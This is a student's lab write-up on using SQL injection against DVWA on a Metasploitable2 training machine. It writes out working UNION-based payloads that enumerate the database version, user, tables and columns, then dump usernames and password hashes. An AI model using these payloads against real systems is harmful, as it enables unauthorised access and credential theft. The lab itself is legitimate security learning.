# Lab: Grabbing Passwords with SQL Injection 

## Objective
In this lab, I used SQL injection to exfiltrate login credentials such as usernames and password hashes from an SQL database. 

## Steps taken
- On the Host PC, opened a Chrome browser to Metasploitable2 DVWA 
- Logged in as admin / password 
- Set the DVWA security level to 'low'
- Went to the SQL Injection page and checked what user IDs were in there
- Tried the various injections from a list of examples from my training course (shown in screenshots below)
- Saved usernames and password hashes I obtained for future use

## Screenshots and observations
*Examining the underlying SQL query*
<img width="932" height="882" alt="2 6 2 - Grabbing Passwords with SQL Injection 1 - examining underlying SQL query" src="https://github.com/user-attachments/assets/e02fc92e-99ee-402d-bf76-766a750747f9" />

*First simple injection revealing all records - hacked or '1'='1*
<img width="938" height="607" alt="2 6 2 - Grabbing Passwords with SQL Injection 2 - first simple injection" src="https://github.com/user-attachments/assets/44271d27-e361-4f88-ad6e-59a4d3aae323" />

*Entering an illegal character (') to force an error and reveal information about the type of SQL database*
<img width="947" height="109" alt="2 6 2 - Grabbing Passwords with SQL Injection 3 - entering illegal character" src="https://github.com/user-attachments/assets/20060063-e11b-4007-9cce-1cf78d1e82c6" />

*Using a UNION statement with the function version() to get database version*

*haha' or 1=1 UNION select null, version() #*
<img width="940" height="558" alt="2 6 2 - Grabbing Passwords with SQL Injection 4 - getting database version" src="https://github.com/user-attachments/assets/f5d717d4-a8e9-4547-8b7e-fea3348c2a83" />

*Getting the database username with the user() function*
*haha' or 1=1 UNION select null, user() #*
<img width="906" height="544" alt="2 6 2 - Grabbing Passwords with SQL Injection 5 - getting username" src="https://github.com/user-attachments/assets/52913ea3-1d67-4ff2-b38b-42b7f47ace0a" />

*Getting the names of the tables in the database*

*haha' or 1=1 UNION select null, table_name from information_schema.tables #*
<img width="921" height="1001" alt="2 6 2 - Grabbing Passwords with SQL Injection 6 - getting all tables" src="https://github.com/user-attachments/assets/2d18402f-1a30-437a-8d22-8d05a7f993e1" />

*Printing out all the te columns in the 'users' table, showing a password column exists*

*haha' or 1=1 UNION select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #*
<img width="929" height="937" alt="2 6 2 - Grabbing Passwords with SQL Injection 7 - printing columns in users table" src="https://github.com/user-attachments/assets/3d866bf3-ae85-4170-823f-f7111581bfbf" />

*Displaying the first name, last name, username and password for each user*

*haha' or 1=1 UNION select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #*
<img width="913" height="880" alt="2 6 2 - Grabbing Passwords with SQL Injection 8 - getting user details and password hashes" src="https://github.com/user-attachments/assets/26c9f633-e0c5-4b3f-8fe7-f97895e18052" />

## Key takeaways
I used example SQL injection code to get the results as I don't know this yet, but this excercise has taught me how easy it is for someone who knows SQL is able to retrieve a lot of information that they shouldn't be able to access.

## Relevance
SQL Injections are one of the most well-known and most used methods of attack, so it's important to understand how it works to protect against it.
